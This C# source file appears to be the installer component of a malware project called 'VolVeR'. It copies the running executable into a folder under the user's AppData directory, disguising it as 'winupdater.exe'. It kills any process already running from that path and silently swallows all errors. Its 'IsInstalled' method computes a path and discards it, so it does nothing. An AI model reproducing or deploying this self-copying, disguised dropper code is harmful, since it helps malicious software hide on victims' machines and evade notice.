using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using VolVeR;


namespace VolVeRFMI
{
    public class Installer
    {
        public FileInfo FileName = new FileInfo("winupdater" + ".exe"); 
        public  DirectoryInfo DirectoryName = new    DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DRR")); 
 
        public void IsInstalled()
        {
            Path.Combine(DirectoryName.FullName, FileName.Name);  
        }

 



        public void CreateDirectory()
        {
            if (DirectoryName.Exists) 
                return;
            DirectoryName.Create(); 
        }

        public void InstallFile()
        {
            string path = Path.Combine(DirectoryName.FullName, FileName.Name);
            if (FileName.Exists) 
            {
                foreach (Process process in Process.GetProcesses())
                {
                    try
                    {
                        if (process.MainModule.FileName == path)
                            process.Kill(); 
                    }
                    catch
                    {
                    }
                }
                File.Delete(path);
                Thread.Sleep(280); 
            }
            using (FileStream fileStream = new FileStream(path, FileMode.Create, FileAccess.Write))
            {
                byte[] buffer = File.ReadAllBytes(Application.ExecutablePath); 
                fileStream.Write(buffer, 0, buffer.Length); 
            }
        }


        public void Run()
        {
            try
            {
                IsInstalled();
                CreateDirectory();
                InstallFile();
            }
            catch
            {
            }
        }

    }
}
